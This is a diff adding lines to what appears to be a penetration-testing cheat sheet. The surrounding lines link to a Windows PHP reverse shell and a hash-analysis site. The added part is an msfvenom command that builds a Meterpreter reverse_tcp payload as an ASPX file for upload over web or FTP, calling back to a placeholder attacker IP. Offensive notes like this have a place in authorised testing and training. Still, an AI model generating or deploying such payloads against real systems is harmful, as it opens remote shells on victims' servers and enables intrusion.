@@ -331,6 +331,12 @@ https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20She
 https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php
 ```
 
+###
+```
+aspx payload for web or  FTP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip> LPORT=4000 -f aspx > rev.aspx
+```
+
 ## Password Cracking
 https://www.tunnelsup.com/hash-analyzer/
 
